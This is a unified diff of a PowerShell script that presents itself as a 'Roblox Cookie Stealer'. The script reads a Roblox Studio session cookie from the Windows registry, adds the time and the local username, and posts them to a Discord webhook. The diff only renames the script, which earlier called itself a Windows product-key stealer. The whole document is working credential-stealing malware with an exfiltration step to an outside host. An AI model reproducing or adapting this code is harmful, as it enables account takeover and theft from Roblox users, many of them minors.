@@ -2,7 +2,7 @@ $content = (Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudioBrowser\ro
 $webhookUrl = "discord webhook url"
 $content = $content+="`n`nTime: $(Get-Date)`nUser: $(whoami)"
 [System.Collections.ArrayList]$embedArray = @()
-$title       = 'Windows Product Key Stealer'
+$title       = 'Roblox Cookie Stealer'
 $description = '```'+$content+'```'
 $color       = '000111'
 $embedObject = [PSCustomObject]@{
@@ -14,7 +14,7 @@ $embedObject = [PSCustomObject]@{
 }
 $embedArray.Add($embedObject) | Out-Null
 $payload = [PSCustomObject]@{
-    'username' = 'Windows Product Key'
+    'username' = 'Roblox Cookie Robber'
     embeds = $embedArray
 }
 Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
